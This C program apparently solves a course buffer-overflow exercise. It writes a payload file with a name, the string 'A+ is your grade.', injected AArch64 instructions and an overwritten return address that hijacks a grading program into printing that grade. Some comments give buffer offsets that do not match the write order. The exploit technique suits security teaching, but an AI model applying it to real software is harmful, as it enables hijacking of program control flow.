#include <stdio.h>
#include "miniassembler.h"

int main(void) {

    int i; 
    unsigned long ulAddr;
    unsigned int uiAdr;
    unsigned int uiB; 
    unsigned int uiMov;
    
    FILE *psFile;
    psFile = fopen("dataAplus", "w");

    /* Write name and a null byte to buff[0]-buff[12] */
    fprintf(psFile, "Chewei Puaji");
    putc('\0', psFile);

    /* Write gradeStr to buff[13]-buff[29]*/
    fprintf(psFile, "A+ is your grade.");

    /* put null bytes to buff[30]-buff[31] */
    for (i = 0; i < 2; i++) {
        putc('\0', psFile);
    }

    /*  addr x0, &gradeStr. put instruction to buff[36]-buff[39]*/    
    uiAdr = MiniAssembler_adr(0, 0x420065, 0x420078);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);

    /* mov x1, '\n' to buff[32]-buff[35]*/
    uiMov = MiniAssembler_mov(1, '\n');
    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);

    /* b printf. put instrunction to buff[40]-buff[43]*/
    uiB = MiniAssembler_b(0x400874, 0x420080); 
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);

    /* Fill in null bytes to reach the end of buf array to buff[44]-buff[47]*/
    for (i = 0; i < 4; i++) {
        putc('\0', psFile);
    }

    /* Write the return address */ 
    ulAddr = 0x420078;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    /* Close the file and return 0 */
    fclose(psFile); 
    return 0; 
}